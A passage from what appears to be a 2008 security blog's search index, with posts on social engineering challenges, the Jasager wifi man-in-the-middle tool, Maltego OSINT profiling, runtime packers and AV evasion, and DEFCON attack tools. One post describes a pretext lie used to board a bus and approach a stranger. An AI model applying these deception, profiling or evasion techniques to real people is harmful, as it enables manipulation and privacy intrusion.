","date":"2008-10-12","objectID":"https://malicious.link/posts/2008/2008-10-12-the-root-of-all-evil-grade/:0:0","tags":["Hacking"],"title":"The Root of All Evil-(grade)","uri":"https://malicious.link/posts/2008/2008-10-12-the-root-of-all-evil-grade/"},{"categories":["social engineering"],"content":"I got an overwhelming response to me stopping the social engineering challenges, which far out-shadows the large response I got against the challenges. In other words, the “AYE\"s have it. As soon as my Maltego series comes to a close I will be starting the challenges back up again. Thank you for your support and I look forward to the continuation of the challenges, I really had fun with the first one. Also, if you have ideas for scenarios, please email me or hit me up on twitter. Include as much detail as possible, especially with the answer. Or, if you want to, leave the answer out, and we’ll see what we come up with. Thanks again, mubix ","date":"2008-10-09","objectID":"https://malicious.link/posts/2008/2008-10-09-social-engineering-challenges-back/:0:0","tags":null,"title":"Social Engineering Challenges Back","uri":"https://malicious.link/posts/2008/2008-10-09-social-engineering-challenges-back/"},{"categories":["jasager"],"content":"If you haven’t heard already about Jasager.. well you probably don’t read this blog, but for those who want to know a bit more about the history of Jasager - Karma on the Fon, where the project is now, and where it’s headed, then buckle up, and hang on while we first travel down memory lane. History: The time was ShmooCon 2006. It was my very first “HACKER” convention. I was there with my buddies from Hak5 and SploitCast. I just so happened to sit in a talk by Dino (A. Dai Zovi). He was talking about Karma, his project that basically sat in the middle of wireless connections and instead of picking out the special bits directed his way, Karma accepted and responded to them all. I was in love, no not with Dino, but the project. I wrote theta44.org in my notebook (the site Dino noted to find out more) and continued on with the craziness that is any con. Having no money to invest in a wireless card that could handle Karma that page with theta44.org kept hounding me. In early 2007, boxgamex (a gentlemen from the Hak5 community) sold me a little Fonera router. What’s the first thing I did? Hack it, put OpenWRT and DD-WRT on it. But one day that page in my notebook showed up again and reminded me of Karma. I looked on Dino’s page and was appalled to find that the project hadn’t gone anywhere. Did no one see the potential that this project had? Putting 2 + 2 (=5) I decided to put Karma on the Fon for an ultra portable wifi attack tool. Well, I am by no means the Killer Coding Ninja Monkey that either Dino or Robin Wood are. I scripted my way into it working for one target at a time. The problem? I did all the work on the Fon. You can see where this is going. At DEFCON 15, I brought my scripted up Fon to test it out in the shark infested waters (Wall of Sheep addition?). Got excited to be there, booted the Fon up in my room, connected to the Fon and change a setting. The Fon bricked. No proof that I had done anything, didn’t even get the chance to test it out. I explained what had happened to my friend Darren Kitchen, and the project really sparked in him. He talked to the Killer Coding Ninja Monkey that I mentioned before, Robin Wood, and before you know it, the project was renewed under a new name “Jasager”, and this time with a better hand at the wheel. What was the point of this history lesson? If you have idea, and someone else has done it. Take it to the next level, and if you don’t have the time, find a partner who does. Enough history, lets get some information. Here is the home page of Jasager: http://www.digininja.org/jasager/index.php HINT: Robin Wood’s main site, while lacking style has some things that you also want to check out. (digininja.org) If you like reading, here is Darren’s blog post on how to get Jasager going If you are more of a visual person, check out episode 405 of Hak5 And if you have problems or want to discuss options and configurations with other Jasager users, check out the Jasager Forum Back to the Furture: MITM (Man-In-The-Middle) attacks on computer systems have been around since the dawn of time. The natural (rapid) progression of security attacks made it guaranteed that MITM would hit Wireless just as hard. If you have ever talked on a CB Radio, you know the frustration when the kids with the high powered antenna start playing the Mortal Kombat soundtrack over the CB without letting up the talk button. This is a simple example of how Jasager works. It gets in the middle of wireless communications. How do you protect against something like that? I don’t know. I don’t believe that there is a protection for Jasager or Karma (again, released in 2006). Where is Jasager heading? I think that adding the functionality of Karmetasploit (H.D. Moore’s project) to a portable device and then maybe shipping that device like the guys over at Errata Security did with an iPhone, would be one dangerous route. Or putting it in a box like Richard Mogull did. Or in a wall like Larry Pesce did. To the future? What if I ","date":"2008-10-09","objectID":"https://malicious.link/posts/2008/2008-10-09-jasager-past-present-and-future/:0:0","tags":null,"title":"Jasager - Past - Present and Future","uri":"https://malicious.link/posts/2008/2008-10-09-jasager-past-present-and-future/"},{"categories":["social engineering"],"content":"Well, it’s not the only answer but I will call them that because it’s what worked for me: Sitting a couple rows down from the line so that no one would see me from the bus line I was targeting, I waited for the bus to come. As soon as it came rolling up and quickly moved into a dash for the door, timing it so that I could cut in line to be the 4th on. When contronted by the bus driver, I said that I had dropped my wallet a few stops back and and wanted to find it. Dropping my wallet while I ‘looked’ for it allowed me to certify this lie. I asked the busdriver if I could ride the bus back around to my original stop. He said yes and I was allowed to ride free of charge. And, due to all of this drama the target was already seated and others have taken up bubble-room spots (no body likes to sit together), so I didn’t look completely odd sitting next to the target. I even got up when a elderly woman came to sit down. By that time dialog was already started with the target and my honor was solidified by my kindness to others. These challenges don’t have prizes or winners, it’s just here to make you think. The goal is not to raise too much suspicion and gain trust. ","date":"2008-10-09","objectID":"https://malicious.link/posts/2008/2008-10-09-social-engineering-challenge-1/:0:0","tags":null,"title":"Social Engineering Challenge #1 Answer","uri":"https://malicious.link/posts/2008/2008-10-09-social-engineering-challenge-1/"},{"categories":["social engineering"],"content":"Here is the scenerio: There is a line of government, and commerical workers that are in line for the bus. The bus is late, and everyone has had a long day of work. Your target is the first person in line. The line is 75 people long for a bus with a max occupancy of 35 people. Your target is the same sex as you and has headphones in their ears. You can use any prop item that would not look out of place in line for a bus with other commuters. Your goal is to sit next to your target in order to start a dialog. You do not need to be 1st, 2nd or even 3rd in line, but you do have to get on the bus with the least amount of suspicion raised. (That doesn’t rule out being flambouant) Comment your solutions with detail. EDIT: I will post how I was able to do it tomorrow. For all of these challenges I will publish the way I succeeded at 11:59 PM EST of the next day. ","date":"2008-10-08","objectID":"https://malicious.link/posts/2008/2008-10-08-social-engineering-challenge-1/:0:0","tags":null,"title":"Social Engineering Challenge #1","uri":"https://malicious.link/posts/2008/2008-10-08-social-engineering-challenge-1/"},{"categories":["internet"],"content":"So there are all kinds of links that I find and queue up to look at but hate keeping them open in tabs, and they aren’t always in Google Reader and I don’t want to spam to twitter, so Mubix’s Links was born. I setup ScribeFire with a new blogspot account and now, no more tabs, it truely feels like an application of GTD. Plus it allows anyone who is interested to follow along via the blogspot feed. As edsmiley commented in IRC something to the effect of that he doesn’t need all the security blog feeds he just lets me do all the work. ","date":"2008-09-29","objectID":"https://malicious.link/posts/2008/2008-09-29-mubixs-links/:0:0","tags":null,"title":"Mubix's Links","uri":"https://malicious.link/posts/2008/2008-09-29-mubixs-links/"},{"categories":["maltego","tools"],"content":"Now that you have had some time to play around with Community Edition or if you were lucky (or rich) enough, the Full version. We are going to start delving into the the pieces of Maltego and then in Part 5 we rip it apart and put it back together for PT-TAS (Penetration Testing - Transform Application Server). I am going to say “investigation” a lot in the coming paragraphs and parts of this article. what I mean when I use this word is everything from ego and tin-hat searches to the military grade or counterintelligence level searches. As stated before, Maltego Community Edition is free. Use it however and for whatever you want. If you think of a new and interesting way of using Maltego please send me an email and I will make it part of this series, or post it in the Maltego Forums. Paterva is always interested in hearing from the community, especially feature requests. First lets outline whats to come: ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:0:0","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["maltego","tools"],"content":"Table of Contents: Part 1 - Introduction Part 2 - Entities and Transforms Part 3 - The Human Factor Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS) Part 5 - Hacks, Tips, and Tricks The reason I am not going into the installation or registration of Maltego is because 1. It’s already installed on Back|Track and 2. Because Paterva already has a great wiki article on the topic. So lets begin: ![](http://s3.media.squarespace.com/production/438411/4879756/uploads/entity.jpg) ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:1:0","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["maltego","tools"],"content":"Entities (wiki article on Entities) Entities are the basic nuts and bolts of your investigation. Entities spawn other entities through the use of transforms. But, what is an entity? Well at the time of this publishing it can be one of the following ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:2:0","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["maltego","tools"],"content":"Infrastructure Palette: AS (Autonomous System Number): This is a number assigned to a network that allows BGP (Border Gateway Protocol) to know where it’s neighbors are. (And there aren’t any exploits for BGP right?) DNS Name: This is a human readable form of an IP. And, unlike my mother believes, a DNS name does NOT mean it’s a web site. For example hr2xp00209.contoso.com does not serve up a web site, well at least it shouldn’t. (And there are no exploits for DNS right? -PPT LINK-) Domain: In the sense of a DNS domain. This can be localdomain.local contoso.com, or microshaft.com IP Address: The 4 byte (or 16 byte with IPv6) set of numbers that computers understand better than DNS names Netblock: A block of contiguous IP addresses that are “owned” Website: (Myspace.com, DUH!) ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:2:1","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["maltego","tools"],"content":"Personal Palette: Email Address:YourSuperCoolHackerHandle@h4x0rbl0gthatyouneverupdate.com (And then you sign that email address with your super secret family-only email address that you never use, with your PGP key) Location:Area 51, Washington DC, The Moon Person: A first and and last name (we will get into handles with “Phrase”, also, remember that PGP key you used, oh it has your full name on there) Phone Number: This is a 7 digit or 10 digit number, returns a lot of false positives in my experiance, but has also pulled some great contact info for companies that weren’t available from their site. (i.e. someone posted their details in a group or forum asking for help) The last entity is “Phrase”. I specifically isolated it because of its untapped power in Maltego. This is a Google hacker’s dream. This entity will send any Google hack (or regular search term/phrase) you have to a search engine (Out of the box it’s Yahoo) and then extracts as many of the above entities as it can. To couple the power of Google hacking with all of the information you have gathered, and if the old adage, “Knowledge is Power” is right. You now have at your disposal a nuclear arsenal worth of “power”. Add PT-TAS (which we will talk about later) and you might as well have an Ion Cannon for your investigation. http://s3.media.squarespace.com/production/438411/4879756/uploads/ion_cannon.serendipityThumb.jpg ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:2:2","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["maltego","tools"],"content":"Transforms (wiki article on Transforms) There are more transforms than I have space for and you really don’t need me to insult your intelligence any more than I already have with my list of entities. So, I am picking out a few of my favorites that might get you a tad bit worried enough to go out and download Maltego, just to see if they pop on you. Email to PG****P: It takes an email address and then checks to see what other email addresses you have signed with your key and what the name associated with those email addresses are, along with the email address you searched for. Makes you kind of think of what other security tools can be turned back on themselves. IP or Netblock to Wiki Edits: With this tool you can get a sense of what changes a company/person/organization makes to Wikipedia. I have had mixed results with how much information return this gets but, as you can see by this interesting graph. Three letter agencies like to make edits ;-) Metadata Extration from Documents: The transform is an information gold mine. It could give you insight into the names of users, the domain’s naming convention, possibly even the internal domain name and version of software made that document. Rapleaf and Spock Search (Social Networking search): If you don’t get anything right of the bat, try again later. These services index items on request so if you are the first one to query and email address or phrase, it might take 20 minutes to index and be ready with results. Also, have you ever added your friends to a social networking site via your address book or contacts list (IM/Webmail/Outlook)? Well what if your address book that you uploaded as a search included every email address or phrase that you have found in Maltego? We have now gotten the basics and the building blocks, next we go into the Human Factor. Sort of like a OCD instructor I will be helping you to make leaps of faith based on logic that Maltego, or any automated system for that matter, just can’t do. ","date":"2008-09-26","objectID":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/:3:0","tags":null,"title":"Maltego 2 and beyond - Part 2","uri":"https://malicious.link/posts/2008/2008-09-26-maltego-2-and-beyond-part-2/"},{"categories":["internet","presentations"],"content":"Do what you love, love what you do is what I have been told since I was young, and Gary V takes that puts it in the mirror and makes you look at it with the following video: ","date":"2008-09-23","objectID":"https://malicious.link/posts/2008/2008-09-23-love-what-you-do/:0:0","tags":null,"title":"Love what you do","uri":"https://malicious.link/posts/2008/2008-09-23-love-what-you-do/"},{"categories":["rant","excuses"],"content":"Due to a PEBKAC error with the ID 10 T, I have had to retype parts 2 and 3, which were ready to go out the door. In the mean time while I fix myself, here are a couple sites that can keep you busy: Search google for exploits: http://www.exploitsearch.com/ Watch just about any TV show (and some movies) online: http://www.surfthechannel.com/ Play any NES game online: http://www.virtualnes.com/ Start a blog without any signup? http://www.posterous.com/ ","date":"2008-09-17","objectID":"https://malicious.link/posts/2008/2008-09-17-confusion-and-delay-/:0:0","tags":null,"title":"Confusion and Delay","uri":"https://malicious.link/posts/2008/2008-09-17-confusion-and-delay-/"},{"categories":["packers"],"content":" So we are taking a short break from my 4 part series on Maltego to bring you a guest post on runtime packers done by your friendly neighborhood Security Shoggoth. Packers are one of those mystical tech items out there that for most people sound too complicated to even look into. What SecShoggoth and I aimed for with this post is to have understandable yet technical and I think he did an awesome job: ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:0:0","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"What is a packer? ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:0","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"What do they do? A packer, also known as a run time packer, is a program which compresses another executable to a smaller size on disk. When executed, the packed executable is uncompressed in memory and executes. The time to uncompress the executable in memory is usually not noticeable, making it very advantageous to use one. There are hundreds of packing programs available. One of the most commonly used is UPX (http://upx.sourceforge.net) which will pack a number of executable formats. Unlike most packers, UPX can unpack a program to its original, uncompressed state. Many packers do not have this functionality and analysts who wish to unpack a program have to find a separate unpacker or manually unpack the program in a debugger. ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:1","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"Why do virus/malware developers use them? There is one side effect of packers that malware developers have found useful. Not only does the packer make the malware smaller and easier to transfer, but they also obfuscate or encrypt the internal components of the malware making static analysis virtually impossible. For example, normally an analyst would be able to look at the internal strings of a malware sample and determine some of its functionality - such as what registry keys it adds, what URLs it contacts, what functions it loads, etc. However, by using a packer on the malware, the internal strings would be compressed and obfuscated, hiding them from view. The only way to view to internal strings would be to unpack the malware - something which is not always an easy thing to do. Some packers also contain anti-virtual machine, anti-sandboxing and anti-debugging “features” which prevent the packed executable from running if it detects any software analysts typically use to analyze malware. This makes it much harder for the malware to be analyzed and will extend the amount of time before it can be reliably detected by AV software. ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:2","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"How do they work? When an executable is packed, the packer compresses the original program and places some wrapper code around it. When the packed program is executed, this wrapper code runs and uncompresses the original program in memory, loads any dynamic libraries needed by the import table and jumps to the original entry point (OEP) of the now uncompressed program where it begins execution. ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:3","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"Will AV detect packed programs? It depends. Not being in the AV industry I can’t comment on every anti-virus program but from my experience with anti-virus and bypassing them, I can make some educated guesses. From my experience, most AV programs handle packers in two ways. First, if they can detect the packer being used they may try to unpack it - provided they have an unpacking routine for that packer. For example, UPX is a common packer (with it’s source available). I would bet that most AV have a UPX unpacking routine which, when it detects a UPX-packed executable, unpacks and scans it. Therefore, if you packed pwdump with a known or common packer, the AV will still detect it. However, if you used a packer the AV did not know how to unpack (such as a custom packer or one the AV does not have a routine for), then the AV would most likely not be able to detect the malicious program on disk and would have to wait until it was launched into memory to detect it. Malware authors already know this so some are starting to use custom packers. The Race To Zero contest at this year’s Defcon was about just this - trying various methods to hide an executable from AV on disk. There are still ways AV can determine if a program has been packed even if it doesn’t know what packer was used. When a program is packed various things happen to the header and the internal structures of the program. AV can detect these signs and make an educated guess that the program is packed by a custom packer and, if it meets some internal AV criteria, the AV may flag the program as malicious. If the AV is able to detect the packer but does not have a routine to unpack it, the AV may still flag the executable as malicious based on the packer it detects. As you blogged about a few days ago, Alex Eckelberry at SunBelt Software did an experiment by packing Windows notepad with various packers and submitting it to VirusTotal. Based on his results, some AV programs are flagging programs as malicious based only on the packer that was used on it. (http://sunbeltblog.blogspot.com/2008/09/how-to-make-notepadexe-malicious-file.html) ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:4","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"What are some resources that I can learn more about packing? If you want to learn the basics on packers, I would recommend Paul Craig’s 2006 Ruxcon presentation “Unpacking Malware, Trojans and Worms. (http://www.security-assessment.com/files/presentations/Ruxcon_2006-_Unpacking_Virus,_Trojans_and_Worms.pdf) Its contains alot of excellent information on packers, how they work and how to unpack them manually. If you want more information on unpacking programs, many reverse engineering sites and blogs have numerous resources on the subject. I would start with OpenRCE (www.openrce.com) and the forums at http://www.reverse-engineering.net. I also like the Websense Security Labs blog (http://securitylabs.websense.com/) as they have posted in the past about their experiences with unpacking malware. There really are way too many resources out there for me to list. In the end, Google is your friend. ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:1:5","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["packers"],"content":"Where can people find out more about me? They can always check out my blog at http://secshoggoth.blogspot.com, follow me on Twitter (secshoggoth) or listen to me on the Security Justice webcast (www.securityjustice.com). :P A commenter who was unable to post their comment for some reason had this to say: PeID is a nice little tool for looking at an exe and finding what it is packed with, what encryption it may be using, and also to look at the strings. It also lets you unpack a lot of exe’s, but can be dangerous as it can let the programs run to do this. It’s nice to use it if you do not want to trace through a debugger and just want a quick way to look at the dll’s it hooks to and the strings in the program. – digip ","date":"2008-09-11","objectID":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/:2:0","tags":null,"title":"Runtime Packers - hold the cheese","uri":"https://malicious.link/posts/2008/2008-09-11-runtime-packers-hold-the-cheese/"},{"categories":["hak5"],"content":"First lets outline whats to come: ","date":"2008-09-08","objectID":"https://malicious.link/posts/2008/2008-09-08-maltego-2-and-beyond-part-1/:0:0","tags":null,"title":"Maltego 2 and beyond - Part 1","uri":"https://malicious.link/posts/2008/2008-09-08-maltego-2-and-beyond-part-1/"},{"categories":["hak5"],"content":"Table of Contents: Part 1 - Introduction Part 2 - Entities and Transforms Part 3 - The Human Factor Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS) Part 5 - Hacks, Tips, and Tricks **EDIT: This and the following posts are also show notes for the **Season 4 premiere** of **Hak5 So Maltego 2 has been released and all I have to show for it are these images stolen from paterva.com ![](http://s3.media.squarespace.com/production/438411/4879756/uploads/maltego_ss1.serendipityThumb.png) ![](http://s3.media.squarespace.com/production/438411/4879756/uploads/maltego_ss2.serendipityThumb.png) and a bit of an explination also stolen from their site: ![](http://s3.media.squarespace.com/production/438411/4879756/uploads/maltego_whatis.serendipityThumb.png) But you aren’t here for what you can find on their site. You are here to find out why Maltego is fun, useful, and something you might want to recommend your boss/secretary/parents to buy. Maltego is hard define because of it’s open nature. It is designed to be whatever that information gatherer wants it to be. But before we go into Maltego’s super powers, lets define the differences between it’s two versions, Full and Community editions. Full is just as it implies. Unfettered. You can make it fly. But it’s 400 bucks a year per client. (Or your organization can talk straight to Paterva about their server/client platform) Community Edition is free, but you are locked down quite a bit. Community Edition is bundled with Back|Track 3 which is don’t by the awesome guys over at Offensive Security. Here are the nags: A 15 second nag screen Save and Export has been disabled Limited zoom levels Can only run transforms on a single entity at a time Cannot copy and paste text from detailed view Transforms limited to 75 per day Throttled client to TAS communication However, if you do have one full version client, you can open saved investigations (mtg files) with it and manipulate it all you want. So that is just one of my tricks and now that we have a baseline down (kinda like getting done with all of your base classes in college), in the following segments of this post I will be showing of some of the electrolyte driven goodness of Maltego and some of the hacks/tricks that will make you look wonder just what you can’t do with Maltego. ","date":"2008-09-08","objectID":"https://malicious.link/posts/2008/2008-09-08-maltego-2-and-beyond-part-1/:1:0","tags":null,"title":"Maltego 2 and beyond - Part 1","uri":"https://malicious.link/posts/2008/2008-09-08-maltego-2-and-beyond-part-1/"},{"categories":["internet"],"content":" So, instead of doing this the right way, which is submitting a bug report to google, I am going to do this the blogger way: Publish article to blog about problem in product Wait for traffic to rise on blog Become giddy at rise in traffic due to outstanding title Watch as traffic falls within days Become angry and write retort (in said blog, still not contacting the company) getting mad about the STILL unfixed problem Actually thats a lie, here is what I reported to Google after I wrote the above statement: This problem only happens in a specific sequence of events, but can be easily reproduced. User 1 opens Google Doc that is collaboratively edited. User 1 closes browser (with save session ability) User 2 opens Google Doc and makes an edit to that same document User 2 saves the new edits (through AutoSave or save/close or save) User 1 at any point after this save (User 2 doesn’t have to have the document closed), opens his saved session browser and it opens the old version of the doc. If user 1 then waits long enough for AutoSave to do its thing or save/closes it, then the document is saved in its old status. This can easily be fixed by reverting via revision history to the “newer” version, but also can easily go unnoticed. A suggestion for a fix would be a nice popup on User 1’s screen saying that there is a newer version of that document available. If you have a fix, please leave a comment. I would really hate to find out that this is a simple preferences setting. ","date":"2008-09-08","objectID":"https://malicious.link/posts/2008/2008-09-08-google-docs-bug-html/:0:0","tags":null,"title":"Google Docs Bug","uri":"https://malicious.link/posts/2008/2008-09-08-google-docs-bug-html/"},{"categories":["av"],"content":"Original Article: http://sunbeltblog.blogspot.com/2008/09/how-to-make-notepadexe-malicious-file.html Archive.org Saved Page Alex Eckelberry over at Sunbelt got an itch to see which virus vendors were just using packer signatures instead of emulating the defaltion process and detecting the virus inside. This is a shortcut that can yield false positives such as demonstarted in Alex’s experiment, but is done due to the overhead such an undertaking would introduce, I assume, to the client software. I bring this up here because I recently conducted a somewhat similar test, although I admittedly know very little about packers. I submitted a couple of No-CD cracks that I got from a unnamed source (GameCopyWorld.com) and tested it with VirusTotal.com to see if they had viruses, and all of them came back positive. I doubted these finding since they were mostly labeld “Trojan.Downloader” and similar generic names. I then used Sunbelt’s very own CWSandbox and a few local tools to determine of the trojan downloaders I had were actually that. All tests came back stating non network connections, packed by UPX, and made minimal DLL calls which were all used to disply windows GUIs. Alex’s article and my recent research renewed my want to learn more about packers. Where to start? Wikipedia. Nope! Wikipedia’s article on runtime packers hasn’t been written yet. I haven’t stopped searching for a good resource on the topic, but if anyone knows one, please leave a comment and a link. Thanks ","date":"2008-09-07","objectID":"https://malicious.link/posts/2008/2008-09-07-notepad-is-a-virus/:0:0","tags":null,"title":"Notepad is a virus","uri":"https://malicious.link/posts/2008/2008-09-07-notepad-is-a-virus/"},{"categories":null,"content":" Just like it’s LOVELY auto download feature, Google Chrome slipped in a new version. I was testing out some of the latest and greatest posts of exploits for .27 and they were failing to work. Checked my version and low and behold a new version number was displayed. I didn’t upgrade, all done automagically. (Evilgrade anyone?) I wonder what will pop on this new version. ","date":"2008-09-07","objectID":"https://malicious.link/posts/2008/200897chrome-all-polished-up-html/:0:0","tags":["Uncategorized"],"title":"Chrome all polished up","uri":"https://malicious.link/posts/2008/200897chrome-all-polished-up-html/"},{"categories":null,"content":"For some reason LinkedIn has become unavailable: Earlier when going to LinkedIn, I was greeted by a wizard saying that they will performing upgrades tonight. I guess they didn’t go as wel as planned. As a security addict though, I always have that sinking feeling when a server is down. Especially one that has personal information about so many people. Hope it’s nothing Fear it’s bad It’s nothing WINS! (We’re doing some front-end network maintenance, on the loadbalancer which hosts the Wizard page. We should be back soon.) – via commenter ","date":"2008-09-07","objectID":"https://malicious.link/posts/2008/200897linkedin-unavailable-html/:0:0","tags":["Uncategorized"],"title":"LinkedIn Unavailable","uri":"https://malicious.link/posts/2008/200897linkedin-unavailable-html/"},{"categories":["Hacking"],"content":"As you may have heard me rant and rave about a special USB stick that downloads contact, messaging, and other information from phones just by plugging them in on Episode 5 of Securabit or read about it via an earlier posting on my blog (Crazed Bovine Traversal). A company called Paraben Corporation went out and made it (Motorola and Samsung support only so far) I first learned about it via CNet’s report “CSI Stick grabs data from cell phones” and you can find it directly on http://csistick.com/ for $199.00 plus you have to buy the accessory “DS Lite” just to read the data on it. (another 99.00). I think they should at least send me one for free for stealing my idea ;-) ","date":"2008-09-03","objectID":"https://malicious.link/posts/2008/200893crazed-bovine-traversal-in-rl-html/:0:0","tags":["Hacking"],"title":"Crazed Bovine Traversal in RL","uri":"https://malicious.link/posts/2008/200893crazed-bovine-traversal-in-rl-html/"},{"categories":["Rant"],"content":"So there is already an exploit: http://blogs.zdnet.com/security/?p=1843 There are naysayers: http://www.tgdaily.com/content/view/39154/108/ And then there is the truth: http://www.stillsecureafteralltheseyears.com/ashimmy/2008/09/sucking-the-chr.html I like the design of the tabs and address bar, but I can do that with a theme in firefox. I want my add-ons, even with the memory problems. Chrome is great for Mom and Pap, but for “Internet Power Users” it falls lightyears short on features. So where is the brass tax? IMHO: Firefox \u003e (INSERT CHROME HERE) \u003e Opera \u003e Safari \u003e IE7 \u003e IE8 \u003e IE6 In other news: Yousif Yalda has made it to the coveted “Stupid People” link category, where until now was solely held by Ashley Park. And the hits just keep rolling in: http://www.milw0rm.com/exploits/6353 – DoS http://evilfingers.com/advisory/google_chrome_poc.php - Original PoC for DoS http://blogs.zdnet.com/security/?p=1847 http://erratasec.blogspot.com/2008/09/lookingglass-vendor-of-week-google.html http://sunbeltblog.blogspot.com/2008/09/chrome-rocks-i-dont-care-what-others.html AUTOMATIC DOWNLOADS? What?! http://www.milw0rm.com/exploits/6355 ","date":"2008-09-03","objectID":"https://malicious.link/posts/2008/200893brass-tax-on-chrome-html/:0:0","tags":["Rant"],"title":"Brass Tax on Chrome","uri":"https://malicious.link/posts/2008/200893brass-tax-on-chrome-html/"},{"categories":["Hacking"],"content":"**EDIT: I got to talk about this DVD on the latest episode of **Securabit** (**Episode 9) Edit 2: There is a cool new Live DVD by the guys at Sun Tzu Data. (Click here for post) NERV-LABS subsidiary Badfoo.net has released quite the awesome DVD. Now, the lucky few of you who have suffered through my constant microsoft-bashing linux evangelism alright have heard about all the Multiboot LiveDVDs out there. Until now, they have all been booting various generic Linux distro. With the release of Badfoo’s LiveDVD, that has all changed: MultiISO LiveDVD is an integrated Live DVD technology which combines some of the very popular Live CD ISOs already available on the internet. It can be used for security reconnaissance, vulnerability identification, penetration testing, system rescue, media center and multimedia, system recovery, etc. It’s a all-in-one multipurpose LiveDVD put together. There’s something in it for everyone. I hope you enjoy it. OS Choices: Backtrack 3 Damn Small Linux 4.2.5 GeeXBoX 1.1 (not geekbox :P ) Damn Vulnerable Linux (Strychnine) 1.4 Knoppix 5.1.1 MPentoo 2006.1 Ophcrack 1.2.2 (with 720 mb tables) Puppy Linux 3.01 Byzantine OS i586-20040404 Now add the awesome power of UNetBootin (Boot ISO via USB) and now you have a USB stick that boots multiple security related Linux operating systems. What do you have on your keychain? ","date":"2008-08-27","objectID":"https://malicious.link/posts/2008/2008827multi-boot-security-livecd-dvd-html/:0:0","tags":["Hacking"],"title":"Multi-Boot Security LiveCD DVD","uri":"https://malicious.link/posts/2008/2008827multi-boot-security-livecd-dvd-html/"},{"categories":["Hacking"],"content":"Originally posted to the Zero Day blog on Ziff Davis: http://blogs.zdnet.com/security/?p=1735 This article was also referenced in a Dark Reading blog post by John Sawyer: http://www.darkreading.com/blog.asp?blog_sectionid=447\u0026doc_id=162049 All updates will reside here as I have no control over the article on Ziff Davis. DEFCON, the 9000+ attendee hacker conference in Vegas has become a sort of hydra conference. It has become more like a global fair than what most people think of conferences; even the badge is highly unique. I say this because there are so many things to do at DEFCON, other than going to talks, that you could spend your whole weekend looking at the “World’s Largest Boar!”, so to speak. One of the CTF (Capture the Flag) contest winners this year actually exclaimed that he only made it to 2 talks in 12 years! I am also one of those individuals who barely get a chance to go to talks and now that the speaker pool is so diverse it’s hard to find all of the “stuff” they release. Before anyone has a chance to post “It’s all on the DEFCON CD dummy” I want to challenge them to try. After a weekend of googling (which came back with few results) and making contact with some of the speakers, I provide you with a mostly accurate list of “stuff” that was released at DEFCON this year. If any of the information is inaccurate, or a tool is missing, please contact me and I will update this post. The DEFCON CD can be found here: http://edge.i-hacked.com/defcon16-cd-iso-posted Think you are good enough? The binaries from Capture the Flag have been posted here: http://nopsr.us/ctf2008/ PE-Scambler by Nick Harbour Description: (pending update) Homepage Link: http://www.rnicrosoft.net/ Email Address: nick.harbour@gmail.com Packet-O-Matic by Guy Martin Description: “A real time packet processor” - It extracts and can reinject packets. This includes VoIP calls in real time, Cable Modem (DOCSIS) traffic, and a whole host of others. Homepage Link: http://www.packet-o-matic.org/ Email Address: gmsoft@tuxicoman.be SA Exploiter by Securestate Description: A GUI SQL Injection tool that creates SQL injection queries and brakes the 64k barrier using MS Debugger. Homepage Link: http://securestate.com/pages/free-tools.aspx Fast-Track by Securestate Description: A python based tool that automates several different typs of attacks including Metasploit’s Autopwn and SQL Injection Homepage Link: http://securestate.com/pages/free-tools.aspx Beholder – by Nelson Murilo and Luis Eduardo Description: An open source wireless 